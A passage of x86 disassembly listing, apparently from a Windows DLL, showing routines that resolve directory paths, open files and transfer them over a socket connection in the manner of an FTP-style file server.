13142cd5:	50                   	push   %eax
13142cd6:	ff 15 10 37 15 13    	call   *0x13153710
13142cdc:	8b f0                	mov    %eax,%esi
13142cde:	3b f3                	cmp    %ebx,%esi
13142ce0:	74 05                	je     0x13142ce7
13142ce2:	83 fe ff             	cmp    $0xffffffff,%esi
13142ce5:	75 0e                	jne    0x13142cf5
13142ce7:	57                   	push   %edi
13142ce8:	55                   	push   %ebp
13142ce9:	ff 74 24 18          	pushl  0x18(%esp)
13142ced:	ff 15 a0 39 15 13    	call   *0x131539a0
13142cf3:	8b f0                	mov    %eax,%esi
13142cf5:	3b f3                	cmp    %ebx,%esi
13142cf7:	75 05                	jne    0x13142cfe
13142cf9:	6a 05                	push   $0x5
13142cfb:	5b                   	pop    %ebx
13142cfc:	eb 17                	jmp    0x13142d15
13142cfe:	53                   	push   %ebx
13142cff:	53                   	push   %ebx
13142d00:	56                   	push   %esi
13142d01:	ff 15 b0 39 15 13    	call   *0x131539b0
13142d07:	85 c0                	test   %eax,%eax
13142d09:	74 03                	je     0x13142d0e
13142d0b:	6a 01                	push   $0x1
13142d0d:	5b                   	pop    %ebx
13142d0e:	56                   	push   %esi
13142d0f:	ff 15 14 37 15 13    	call   *0x13153714
13142d15:	ff 74 24 10          	pushl  0x10(%esp)
13142d19:	ff 15 14 37 15 13    	call   *0x13153714
13142d1f:	5f                   	pop    %edi
13142d20:	5e                   	pop    %esi
13142d21:	8b c3                	mov    %ebx,%eax
13142d23:	5d                   	pop    %ebp
13142d24:	5b                   	pop    %ebx
13142d25:	59                   	pop    %ecx
13142d26:	c3                   	ret    
13142d27:	55                   	push   %ebp
13142d28:	8b ec                	mov    %esp,%ebp
13142d2a:	83 ec 10             	sub    $0x10,%esp
13142d2d:	56                   	push   %esi
13142d2e:	57                   	push   %edi
13142d2f:	8d 45 f0             	lea    -0x10(%ebp),%eax
13142d32:	68 9c ec 14 13       	push   $0x1314ec9c
13142d37:	50                   	push   %eax
13142d38:	e8 9c 30 00 00       	call   0x13145dd9
13142d3d:	59                   	pop    %ecx
13142d3e:	33 f6                	xor    %esi,%esi
13142d40:	59                   	pop    %ecx
13142d41:	8d 45 f0             	lea    -0x10(%ebp),%eax
13142d44:	56                   	push   %esi
13142d45:	56                   	push   %esi
13142d46:	6a 03                	push   $0x3
13142d48:	56                   	push   %esi
13142d49:	56                   	push   %esi
13142d4a:	68 00 00 00 c0       	push   $0xc0000000
13142d4f:	50                   	push   %eax
13142d50:	ff 15 e0 33 15 13    	call   *0x131533e0
13142d56:	8b f8                	mov    %eax,%edi
13142d58:	83 ff ff             	cmp    $0xffffffff,%edi
13142d5b:	74 1b                	je     0x13142d78
13142d5d:	8d 45 fc             	lea    -0x4(%ebp),%eax
13142d60:	56                   	push   %esi
13142d61:	50                   	push   %eax
13142d62:	56                   	push   %esi
13142d63:	56                   	push   %esi
13142d64:	56                   	push   %esi
13142d65:	56                   	push   %esi
13142d66:	ff 15 7c 37 15 13    	call   *0x1315377c
13142d6c:	50                   	push   %eax
13142d6d:	57                   	push   %edi
13142d6e:	ff 15 6c 37 15 13    	call   *0x1315376c
13142d74:	85 c0                	test   %eax,%eax
13142d76:	75 04                	jne    0x13142d7c
13142d78:	33 c0                	xor    %eax,%eax
13142d7a:	eb 0a                	jmp    0x13142d86
13142d7c:	57                   	push   %edi
13142d7d:	ff 15 80 33 15 13    	call   *0x13153380
13142d83:	6a 01                	push   $0x1
13142d85:	58                   	pop    %eax
13142d86:	5f                   	pop    %edi
13142d87:	5e                   	pop    %esi
13142d88:	c9                   	leave  
13142d89:	c3                   	ret    
13142d8a:	53                   	push   %ebx
13142d8b:	56                   	push   %esi
13142d8c:	8b 74 24 0c          	mov    0xc(%esp),%esi
13142d90:	33 db                	xor    %ebx,%ebx
13142d92:	3b f3                	cmp    %ebx,%esi
13142d94:	74 5c                	je     0x13142df2
13142d96:	57                   	push   %edi
13142d97:	6a 1c                	push   $0x1c
13142d99:	5f                   	pop    %edi
13142d9a:	8d 86 12 07 00 00    	lea    0x712(%esi),%eax
13142da0:	57                   	push   %edi
13142da1:	53                   	push   %ebx
13142da2:	50                   	push   %eax
13142da3:	e8 7a f8 ff ff       	call   0x13142622
13142da8:	57                   	push   %edi
13142da9:	8d 86 2e 07 00 00    	lea    0x72e(%esi),%eax
13142daf:	53                   	push   %ebx
13142db0:	50                   	push   %eax
13142db1:	e8 6c f8 ff ff       	call   0x13142622
13142db6:	57                   	push   %edi
13142db7:	8d 86 4a 07 00 00    	lea    0x74a(%esi),%eax
13142dbd:	53                   	push   %ebx
13142dbe:	50                   	push   %eax
13142dbf:	e8 5e f8 ff ff       	call   0x13142622
13142dc4:	57                   	push   %edi
13142dc5:	8d 86 66 07 00 00    	lea    0x766(%esi),%eax
13142dcb:	53                   	push   %ebx
13142dcc:	50                   	push   %eax
13142dcd:	e8 50 f8 ff ff       	call   0x13142622
13142dd2:	57                   	push   %edi
13142dd3:	8d 86 82 07 00 00    	lea    0x782(%esi),%eax
13142dd9:	53                   	push   %ebx
13142dda:	50                   	push   %eax
13142ddb:	e8 42 f8 ff ff       	call   0x13142622
13142de0:	57                   	push   %edi
13142de1:	81 c6 9e 07 00 00    	add    $0x79e,%esi
13142de7:	53                   	push   %ebx
13142de8:	56                   	push   %esi
13142de9:	e8 34 f8 ff ff       	call   0x13142622
13142dee:	83 c4 48             	add    $0x48,%esp
13142df1:	5f                   	pop    %edi
13142df2:	5e                   	pop    %esi
13142df3:	5b                   	pop    %ebx
13142df4:	c3                   	ret    
13142df5:	8b 44 24 04          	mov    0x4(%esp),%eax
13142df9:	56                   	push   %esi
13142dfa:	80 b8 12 03 00 00 2f 	cmpb   $0x2f,0x312(%eax)
13142e01:	8d b0 12 03 00 00    	lea    0x312(%eax),%esi
13142e07:	75 0a                	jne    0x13142e13
13142e09:	80 7e 01 00          	cmpb   $0x0,0x1(%esi)
13142e0d:	75 04                	jne    0x13142e13
13142e0f:	33 c0                	xor    %eax,%eax
13142e11:	5e                   	pop    %esi
13142e12:	c3                   	ret    
13142e13:	56                   	push   %esi
13142e14:	e8 e4 f8 ff ff       	call   0x131426fd
13142e19:	83 f8 02             	cmp    $0x2,%eax
13142e1c:	59                   	pop    %ecx
13142e1d:	75 09                	jne    0x13142e28
13142e1f:	80 66 01 00          	andb   $0x0,0x1(%esi)
13142e23:	c6 06 2f             	movb   $0x2f,(%esi)
13142e26:	eb 2a                	jmp    0x13142e52
13142e28:	56                   	push   %esi
13142e29:	e8 cf f8 ff ff       	call   0x131426fd
13142e2e:	83 e8 02             	sub    $0x2,%eax
13142e31:	59                   	pop    %ecx
13142e32:	78 09                	js     0x13142e3d
13142e34:	80 3c 30 2f          	cmpb   $0x2f,(%eax,%esi,1)
13142e38:	74 03                	je     0x13142e3d
13142e3a:	48                   	dec    %eax
13142e3b:	79 f7                	jns    0x13142e34
13142e3d:	b9 00 04 00 00       	mov    $0x400,%ecx
13142e42:	2b c8                	sub    %eax,%ecx
13142e44:	03 c6                	add    %esi,%eax
13142e46:	51                   	push   %ecx
13142e47:	6a 00                	push   $0x0
13142e49:	50                   	push   %eax
13142e4a:	e8 d3 f7 ff ff       	call   0x13142622
13142e4f:	83 c4 0c             	add    $0xc,%esp
13142e52:	6a 01                	push   $0x1
13142e54:	58                   	pop    %eax
13142e55:	5e                   	pop    %esi
13142e56:	c3                   	ret    
13142e57:	56                   	push   %esi
13142e58:	8b 74 24 0c          	mov    0xc(%esp),%esi
13142e5c:	68 00 04 00 00       	push   $0x400
13142e61:	6a 00                	push   $0x0
13142e63:	56                   	push   %esi
13142e64:	e8 b9 f7 ff ff       	call   0x13142622
13142e69:	8b 44 24 14          	mov    0x14(%esp),%eax
13142e6d:	8a 48 01             	mov    0x1(%eax),%cl
13142e70:	83 c0 02             	add    $0x2,%eax
13142e73:	88 0e                	mov    %cl,(%esi)
13142e75:	c6 46 01 3a          	movb   $0x3a,0x1(%esi)
13142e79:	50                   	push   %eax
13142e7a:	83 c6 02             	add    $0x2,%esi
13142e7d:	68 00 d1 14 13       	push   $0x1314d100
13142e82:	56                   	push   %esi
13142e83:	ff 15 98 39 15 13    	call   *0x13153998
13142e89:	83 c4 18             	add    $0x18,%esp
13142e8c:	6a 01                	push   $0x1
13142e8e:	58                   	pop    %eax
13142e8f:	5e                   	pop    %esi
13142e90:	c3                   	ret    
13142e91:	55                   	push   %ebp
13142e92:	8b ec                	mov    %esp,%ebp
13142e94:	81 ec 40 09 00 00    	sub    $0x940,%esp
13142e9a:	53                   	push   %ebx
13142e9b:	8b 5d 0c             	mov    0xc(%ebp),%ebx
13142e9e:	56                   	push   %esi
13142e9f:	8b 75 08             	mov    0x8(%ebp),%esi
13142ea2:	57                   	push   %edi
13142ea3:	8d bb 12 03 00 00    	lea    0x312(%ebx),%edi
13142ea9:	8a 06                	mov    (%esi),%al
13142eab:	3c 2e                	cmp    $0x2e,%al
13142ead:	75 11                	jne    0x13142ec0
13142eaf:	38 46 01             	cmp    %al,0x1(%esi)
13142eb2:	75 0c                	jne    0x13142ec0
13142eb4:	53                   	push   %ebx
13142eb5:	e8 3b ff ff ff       	call   0x13142df5
13142eba:	59                   	pop    %ecx
13142ebb:	e9 9b 00 00 00       	jmp    0x13142f5b
13142ec0:	3c 2f                	cmp    $0x2f,%al
13142ec2:	75 0c                	jne    0x13142ed0
13142ec4:	56                   	push   %esi
13142ec5:	57                   	push   %edi
13142ec6:	ff 15 98 39 15 13    	call   *0x13153998
13142ecc:	59                   	pop    %ecx
13142ecd:	59                   	pop    %ecx
13142ece:	eb 3a                	jmp    0x13142f0a
13142ed0:	8d 85 c0 fa ff ff    	lea    -0x540(%ebp),%eax
13142ed6:	57                   	push   %edi
13142ed7:	50                   	push   %eax
13142ed8:	ff 15 98 39 15 13    	call   *0x13153998
13142ede:	57                   	push   %edi
13142edf:	e8 19 f8 ff ff       	call   0x131426fd
13142ee4:	83 c4 0c             	add    $0xc,%esp
13142ee7:	83 f8 01             	cmp    $0x1,%eax
13142eea:	8d 85 c0 fa ff ff    	lea    -0x540(%ebp),%eax
13142ef0:	56                   	push   %esi
13142ef1:	50                   	push   %eax
13142ef2:	75 07                	jne    0x13142efb
13142ef4:	68 14 ed 14 13       	push   $0x1314ed14
13142ef9:	eb 05                	jmp    0x13142f00
13142efb:	68 0c ed 14 13       	push   $0x1314ed0c
13142f00:	57                   	push   %edi
13142f01:	ff 15 98 39 15 13    	call   *0x13153998
13142f07:	83 c4 10             	add    $0x10,%esp
13142f0a:	8d 85 c0 f6 ff ff    	lea    -0x940(%ebp),%eax
13142f10:	50                   	push   %eax
13142f11:	57                   	push   %edi
13142f12:	e8 40 ff ff ff       	call   0x13142e57
13142f17:	8d 85 c0 f6 ff ff    	lea    -0x940(%ebp),%eax
13142f1d:	50                   	push   %eax
13142f1e:	e8 da f7 ff ff       	call   0x131426fd
13142f23:	83 c4 0c             	add    $0xc,%esp
13142f26:	83 f8 04             	cmp    $0x4,%eax
13142f29:	7d 05                	jge    0x13142f30
13142f2b:	6a 01                	push   $0x1
13142f2d:	58                   	pop    %eax
13142f2e:	eb 2b                	jmp    0x13142f5b
13142f30:	8d 85 c0 fe ff ff    	lea    -0x140(%ebp),%eax
13142f36:	50                   	push   %eax
13142f37:	8d 85 c0 f6 ff ff    	lea    -0x940(%ebp),%eax
13142f3d:	50                   	push   %eax
13142f3e:	ff 15 b8 33 15 13    	call   *0x131533b8
13142f44:	83 f8 ff             	cmp    $0xffffffff,%eax
13142f47:	74 09                	je     0x13142f52
13142f49:	f6 85 c0 fe ff ff 10 	testb  $0x10,-0x140(%ebp)
13142f50:	75 d9                	jne    0x13142f2b
13142f52:	53                   	push   %ebx
13142f53:	e8 9d fe ff ff       	call   0x13142df5
13142f58:	59                   	pop    %ecx
13142f59:	33 c0                	xor    %eax,%eax
13142f5b:	5f                   	pop    %edi
13142f5c:	5e                   	pop    %esi
13142f5d:	5b                   	pop    %ebx
13142f5e:	c9                   	leave  
13142f5f:	c3                   	ret    
13142f60:	55                   	push   %ebp
13142f61:	8b ec                	mov    %esp,%ebp
13142f63:	81 ec 00 04 00 00    	sub    $0x400,%esp
13142f69:	56                   	push   %esi
13142f6a:	8b 75 08             	mov    0x8(%ebp),%esi
13142f6d:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142f73:	50                   	push   %eax
13142f74:	8d 86 12 03 00 00    	lea    0x312(%esi),%eax
13142f7a:	50                   	push   %eax
13142f7b:	e8 d7 fe ff ff       	call   0x13142e57
13142f80:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142f86:	68 1c ed 14 13       	push   $0x1314ed1c
13142f8b:	50                   	push   %eax
13142f8c:	e8 e1 f7 ff ff       	call   0x13142772
13142f91:	81 c6 14 01 00 00    	add    $0x114,%esi
13142f97:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142f9d:	56                   	push   %esi
13142f9e:	50                   	push   %eax
13142f9f:	e8 ce f7 ff ff       	call   0x13142772
13142fa4:	83 c4 18             	add    $0x18,%esp
13142fa7:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142fad:	50                   	push   %eax
13142fae:	ff 15 c8 36 15 13    	call   *0x131536c8
13142fb4:	5e                   	pop    %esi
13142fb5:	c9                   	leave  
13142fb6:	c3                   	ret    
13142fb7:	55                   	push   %ebp
13142fb8:	8b ec                	mov    %esp,%ebp
13142fba:	81 ec 00 04 00 00    	sub    $0x400,%esp
13142fc0:	56                   	push   %esi
13142fc1:	8b 75 08             	mov    0x8(%ebp),%esi
13142fc4:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142fca:	50                   	push   %eax
13142fcb:	8d 86 12 03 00 00    	lea    0x312(%esi),%eax
13142fd1:	50                   	push   %eax
13142fd2:	e8 80 fe ff ff       	call   0x13142e57
13142fd7:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142fdd:	68 1c ed 14 13       	push   $0x1314ed1c
13142fe2:	50                   	push   %eax
13142fe3:	e8 8a f7 ff ff       	call   0x13142772
13142fe8:	83 c6 10             	add    $0x10,%esi
13142feb:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13142ff1:	56                   	push   %esi
13142ff2:	50                   	push   %eax
13142ff3:	e8 7a f7 ff ff       	call   0x13142772
13142ff8:	83 c4 18             	add    $0x18,%esp
13142ffb:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13143001:	6a 00                	push   $0x0
13143003:	50                   	push   %eax
13143004:	ff 15 7c 33 15 13    	call   *0x1315337c
1314300a:	5e                   	pop    %esi
1314300b:	c9                   	leave  
1314300c:	c3                   	ret    
1314300d:	55                   	push   %ebp
1314300e:	8b ec                	mov    %esp,%ebp
13143010:	81 ec 00 08 00 00    	sub    $0x800,%esp
13143016:	53                   	push   %ebx
13143017:	56                   	push   %esi
13143018:	57                   	push   %edi
13143019:	8b 7d 08             	mov    0x8(%ebp),%edi
1314301c:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
13143022:	8d 9f 12 03 00 00    	lea    0x312(%edi),%ebx
13143028:	50                   	push   %eax
13143029:	53                   	push   %ebx
1314302a:	e8 28 fe ff ff       	call   0x13142e57
1314302f:	be 1c ed 14 13       	mov    $0x1314ed1c,%esi
13143034:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
1314303a:	56                   	push   %esi
1314303b:	50                   	push   %eax
1314303c:	e8 31 f7 ff ff       	call   0x13142772
13143041:	81 c7 13 02 00 00    	add    $0x213,%edi
13143047:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
1314304d:	57                   	push   %edi
1314304e:	50                   	push   %eax
1314304f:	e8 1e f7 ff ff       	call   0x13142772
13143054:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
1314305a:	50                   	push   %eax
1314305b:	53                   	push   %ebx
1314305c:	e8 f6 fd ff ff       	call   0x13142e57
13143061:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13143067:	56                   	push   %esi
13143068:	50                   	push   %eax
13143069:	e8 04 f7 ff ff       	call   0x13142772
1314306e:	ff 75 0c             	pushl  0xc(%ebp)
13143071:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13143077:	50                   	push   %eax
13143078:	e8 f5 f6 ff ff       	call   0x13142772
1314307d:	83 c4 30             	add    $0x30,%esp
13143080:	8d 85 00 fc ff ff    	lea    -0x400(%ebp),%eax
13143086:	50                   	push   %eax
13143087:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
1314308d:	50                   	push   %eax
1314308e:	ff 15 0c 10 14 13    	call   *0x1314100c
13143094:	5f                   	pop    %edi
13143095:	5e                   	pop    %esi
13143096:	5b                   	pop    %ebx
13143097:	c9                   	leave  
13143098:	c3                   	ret    
13143099:	55                   	push   %ebp
1314309a:	8b ec                	mov    %esp,%ebp
1314309c:	81 ec 2c 0b 00 00    	sub    $0xb2c,%esp
131430a2:	56                   	push   %esi
131430a3:	8b 75 08             	mov    0x8(%ebp),%esi
131430a6:	8d 85 d4 f8 ff ff    	lea    -0x72c(%ebp),%eax
131430ac:	57                   	push   %edi
131430ad:	50                   	push   %eax
131430ae:	8d 86 12 03 00 00    	lea    0x312(%esi),%eax
131430b4:	50                   	push   %eax
131430b5:	e8 9d fd ff ff       	call   0x13142e57
131430ba:	8d 85 d4 f8 ff ff    	lea    -0x72c(%ebp),%eax
131430c0:	68 1c ed 14 13       	push   $0x1314ed1c
131430c5:	50                   	push   %eax
131430c6:	e8 a7 f6 ff ff       	call   0x13142772
131430cb:	8d 86 14 01 00 00    	lea    0x114(%esi),%eax
131430d1:	50                   	push   %eax
131430d2:	8d 85 d4 f8 ff ff    	lea    -0x72c(%ebp),%eax
131430d8:	50                   	push   %eax
131430d9:	e8 94 f6 ff ff       	call   0x13142772
131430de:	83 c4 18             	add    $0x18,%esp
131430e1:	33 ff                	xor    %edi,%edi
131430e3:	8d 85 d4 f8 ff ff    	lea    -0x72c(%ebp),%eax
131430e9:	57                   	push   %edi
131430ea:	57                   	push   %edi
131430eb:	6a 03                	push   $0x3
131430ed:	57                   	push   %edi
131430ee:	6a 01                	push   $0x1
131430f0:	68 00 00 00 80       	push   $0x80000000
131430f5:	50                   	push   %eax
131430f6:	ff 15 e0 33 15 13    	call   *0x131533e0
131430fc:	83 f8 ff             	cmp    $0xffffffff,%eax
131430ff:	89 45 08             	mov    %eax,0x8(%ebp)
13143102:	75 38                	jne    0x1314313c
13143104:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1314310a:	68 a4 ed 14 13       	push   $0x1314eda4
1314310f:	50                   	push   %eax
13143110:	ff 15 98 39 15 13    	call   *0x13153998
13143116:	59                   	pop    %ecx
13143117:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1314311d:	59                   	pop    %ecx
1314311e:	57                   	push   %edi
1314311f:	50                   	push   %eax
13143120:	e8 d8 f5 ff ff       	call   0x131426fd
13143125:	59                   	pop    %ecx
13143126:	50                   	push   %eax
13143127:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1314312d:	50                   	push   %eax
1314312e:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
13143134:	ff 15 68 37 15 13    	call   *0x13153768
1314313a:	eb 13                	jmp    0x1314314f
1314313c:	57                   	push   %edi
1314313d:	6a 01                	push   $0x1
1314313f:	6a 02                	push   $0x2
13143141:	ff 15 64 35 15 13    	call   *0x13153564
13143147:	83 f8 ff             	cmp    $0xffffffff,%eax
1314314a:	89 45 fc             	mov    %eax,-0x4(%ebp)
1314314d:	75 07                	jne    0x13143156
1314314f:	33 c0                	xor    %eax,%eax
13143151:	e9 9e 01 00 00       	jmp    0x131432f4
13143156:	8d 86 66 07 00 00    	lea    0x766(%esi),%eax
1314315c:	53                   	push   %ebx
1314315d:	50                   	push   %eax
1314315e:	8d 86 4a 07 00 00    	lea    0x74a(%esi),%eax
13143164:	50                   	push   %eax
13143165:	8d 86 2e 07 00 00    	lea    0x72e(%esi),%eax
1314316b:	50                   	push   %eax
1314316c:	8d 86 12 07 00 00    	lea    0x712(%esi),%eax
13143172:	50                   	push   %eax
13143173:	8d 45 d4             	lea    -0x2c(%ebp),%eax
13143176:	68 98 ed 14 13       	push   $0x1314ed98
1314317b:	50                   	push   %eax
1314317c:	ff 15 98 39 15 13    	call   *0x13153998
13143182:	8d 86 82 07 00 00    	lea    0x782(%esi),%eax
13143188:	50                   	push   %eax
13143189:	e8 7a f6 ff ff       	call   0x13142808
1314318e:	33 db                	xor    %ebx,%ebx
13143190:	8a f8                	mov    %al,%bh
13143192:	8d 86 9e 07 00 00    	lea    0x79e(%esi),%eax
13143198:	50                   	push   %eax
13143199:	e8 6a f6 ff ff       	call   0x13142808
1314319e:	8a d8                	mov    %al,%bl
131431a0:	83 c4 20             	add    $0x20,%esp
131431a3:	8b c3                	mov    %ebx,%eax
131431a5:	66 c7 45 e8 02 00    	movw   $0x2,-0x18(%ebp)
131431ab:	50                   	push   %eax
131431ac:	ff 15 8c 37 15 13    	call   *0x1315378c
131431b2:	66 89 45 ea          	mov    %ax,-0x16(%ebp)
131431b6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
131431b9:	50                   	push   %eax
131431ba:	ff 15 ac 39 15 13    	call   *0x131539ac
131431c0:	89 45 ec             	mov    %eax,-0x14(%ebp)
131431c3:	8d 45 e4             	lea    -0x1c(%ebp),%eax
131431c6:	50                   	push   %eax
131431c7:	ff 75 08             	pushl  0x8(%ebp)
131431ca:	ff 15 a8 39 15 13    	call   *0x131539a8
131431d0:	50                   	push   %eax
131431d1:	8d 85 d4 fc ff ff    	lea    -0x32c(%ebp),%eax
131431d7:	50                   	push   %eax
131431d8:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
131431de:	68 5c ed 14 13       	push   $0x1314ed5c
131431e3:	50                   	push   %eax
131431e4:	ff 15 98 39 15 13    	call   *0x13153998
131431ea:	83 c4 10             	add    $0x10,%esp
131431ed:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
131431f3:	57                   	push   %edi
131431f4:	50                   	push   %eax
131431f5:	e8 03 f5 ff ff       	call   0x131426fd
131431fa:	59                   	pop    %ecx
131431fb:	50                   	push   %eax
131431fc:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
13143202:	50                   	push   %eax
13143203:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
13143209:	ff 15 68 37 15 13    	call   *0x13153768
1314320f:	8d 45 e8             	lea    -0x18(%ebp),%eax
13143212:	6a 10                	push   $0x10
13143214:	50                   	push   %eax
13143215:	ff 75 fc             	pushl  -0x4(%ebp)
13143218:	ff 15 34 37 15 13    	call   *0x13153734
1314321e:	83 f8 ff             	cmp    $0xffffffff,%eax
13143221:	5b                   	pop    %ebx
13143222:	75 3b                	jne    0x1314325f
13143224:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1314322a:	68 38 ed 14 13       	push   $0x1314ed38
1314322f:	50                   	push   %eax
13143230:	ff 15 98 39 15 13    	call   *0x13153998
13143236:	59                   	pop    %ecx
13143237:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1314323d:	59                   	pop    %ecx
1314323e:	57                   	push   %edi
1314323f:	50                   	push   %eax
13143240:	e8 b8 f4 ff ff       	call   0x131426fd
13143245:	59                   	pop    %ecx
13143246:	50                   	push   %eax
13143247:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
1314324d:	50                   	push   %eax
1314324e:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
13143254:	ff 15 68 37 15 13    	call   *0x13153768
1314325a:	e9 8a 00 00 00       	jmp    0x131432e9
1314325f:	39 3d 28 2c 15 13    	cmp    %edi,0x13152c28
13143265:	74 40                	je     0x131432a7
13143267:	8d 45 f8             	lea    -0x8(%ebp),%eax
1314326a:	57                   	push   %edi
1314326b:	50                   	push   %eax
1314326c:	8d 85 d4 f4 ff ff    	lea    -0xb2c(%ebp),%eax
13143272:	68 00 04 00 00       	push   $0x400
13143277:	50                   	push   %eax
13143278:	ff 75 08             	pushl  0x8(%ebp)
1314327b:	ff 15 54 35 15 13    	call   *0x13153554
13143281:	85 c0                	test   %eax,%eax
13143283:	74 22                	je     0x131432a7
13143285:	39 7d f8             	cmp    %edi,-0x8(%ebp)
13143288:	74 1d                	je     0x131432a7
1314328a:	57                   	push   %edi
1314328b:	8d 85 d4 f4 ff ff    	lea    -0xb2c(%ebp),%eax
13143291:	ff 75 f8             	pushl  -0x8(%ebp)
13143294:	50                   	push   %eax
13143295:	ff 75 fc             	pushl  -0x4(%ebp)
13143298:	ff 15 68 37 15 13    	call   *0x13153768
1314329e:	3b c7                	cmp    %edi,%eax
131432a0:	74 05                	je     0x131432a7
131432a2:	83 f8 ff             	cmp    $0xffffffff,%eax
131432a5:	75 b8                	jne    0x1314325f
131432a7:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
131432ad:	68 20 ed 14 13       	push   $0x1314ed20
131432b2:	50                   	push   %eax
131432b3:	ff 15 98 39 15 13    	call   *0x13153998
131432b9:	59                   	pop    %ecx
131432ba:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
131432c0:	59                   	pop    %ecx
131432c1:	57                   	push   %edi
131432c2:	50                   	push   %eax
131432c3:	e8 35 f4 ff ff       	call   0x131426fd
131432c8:	59                   	pop    %ecx
131432c9:	50                   	push   %eax
131432ca:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
131432d0:	50                   	push   %eax
131432d1:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
131432d7:	ff 15 68 37 15 13    	call   *0x13153768
131432dd:	ff 75 08             	pushl  0x8(%ebp)
131432e0:	ff 15 80 33 15 13    	call   *0x13153380
131432e6:	6a 01                	push   $0x1
131432e8:	5f                   	pop    %edi
131432e9:	ff 75 fc             	pushl  -0x4(%ebp)
131432ec:	ff 15 e4 36 15 13    	call   *0x131536e4
131432f2:	8b c7                	mov    %edi,%eax
131432f4:	5f                   	pop    %edi
131432f5:	5e                   	pop    %esi
131432f6:	c9                   	leave  
131432f7:	c3                   	ret    
131432f8:	55                   	push   %ebp
131432f9:	8b ec                	mov    %esp,%ebp
131432fb:	81 ec 28 0b 00 00    	sub    $0xb28,%esp
13143301:	56                   	push   %esi
13143302:	8b 75 08             	mov    0x8(%ebp),%esi
13143305:	8d 85 d8 f9 ff ff    	lea    -0x628(%ebp),%eax
1314330b:	57                   	push   %edi
1314330c:	50                   	push   %eax
1314330d:	8d 86 12 03 00 00    	lea    0x312(%esi),%eax
13143313:	50                   	push   %eax
13143314:	e8 3e fb ff ff       	call   0x13142e57
13143319:	8d 85 d8 f9 ff ff    	lea    -0x628(%ebp),%eax
1314331f:	68 1c ed 14 13       	push   $0x1314ed1c
13143324:	50                   	push   %eax
13143325:	e8 48 f4 ff ff       	call   0x13142772
1314332a:	8d 86 14 01 00 00    	lea    0x114(%esi),%eax
13143330:	50                   	push   %eax
13143331:	8d 85 d8 f9 ff ff    	lea    -0x628(%ebp),%eax
13143337:	50                   	push   %eax
13143338:	e8 35 f4 ff ff       	call   0x13142772
1314333d:	83 c4 18             	add    $0x18,%esp
13143340:	8d 85 d8 f9 ff ff    	lea    -0x628(%ebp),%eax
13143346:	50                   	push   %eax
13143347:	ff 15 c8 36 15 13    	call   *0x131536c8
1314334d:	33 ff                	xor    %edi,%edi
1314334f:	8d 85 d8 f9 ff ff    	lea    -0x628(%ebp),%eax
13143355:	57                   	push   %edi
13143356:	57                   	push   %edi
13143357:	6a 01                	push   $0x1
13143359:	57                   	push   %edi
1314335a:	57                   	push   %edi
1314335b:	68 00 00 00 40       	push   $0x40000000
13143360:	50                   	push   %eax
13143361:	ff 15 e0 33 15 13    	call   *0x131533e0
13143367:	83 f8 ff             	cmp    $0xffffffff,%eax
1314336a:	89 45 fc             	mov    %eax,-0x4(%ebp)
1314336d:	75 38                	jne    0x131433a7
1314336f:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
13143375:	68 f4 ed 14 13       	push   $0x1314edf4
1314337a:	50                   	push   %eax
1314337b:	ff 15 98 39 15 13    	call   *0x13153998
13143381:	59                   	pop    %ecx
13143382:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
13143388:	59                   	pop    %ecx
13143389:	57                   	push   %edi
1314338a:	50                   	push   %eax
1314338b:	e8 6d f3 ff ff       	call   0x131426fd
13143390:	59                   	pop    %ecx
13143391:	50                   	push   %eax
13143392:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
13143398:	50                   	push   %eax
13143399:	ff b6 bc 07 00 00    	pushl  0x7bc(%esi)
1314339f:	ff 15 68 37 15 13    	call   *0x13153768
131433a5:	eb 13                	jmp    0x131433ba
131433a7:	57                   	push   %edi
131433a8:	6a 01                	push   $0x1
131433aa:	6a 02                	push   $0x2
131433ac:	ff 15 64 35 15 13    	call   *0x13153564
131433b2:	83 f8 ff             	cmp    $0xffffffff,%eax
131433b5:	89 45 08             	mov    %eax,0x8(%ebp)
131433b8:	75 07                	jne    0x131433c1
131433ba:	33 c0                	xor    %eax,%eax
131433bc:	e9 8e 01 00 00       	jmp    0x1314354f
131433c1:	8d 86 66 07 00 00    	lea    0x766(%esi),%eax
131433c7:	53                   	push   %ebx
131433c8:	50                   	push   %eax
131433c9:	8d 86 4a 07 00 00    	lea    0x74a(%esi),%eax
131433cf:	50                   	push   %eax
131433d0:	8d 86 2e 07 00 00    	lea    0x72e(%esi),%eax
131433d6:	50                   	push   %eax
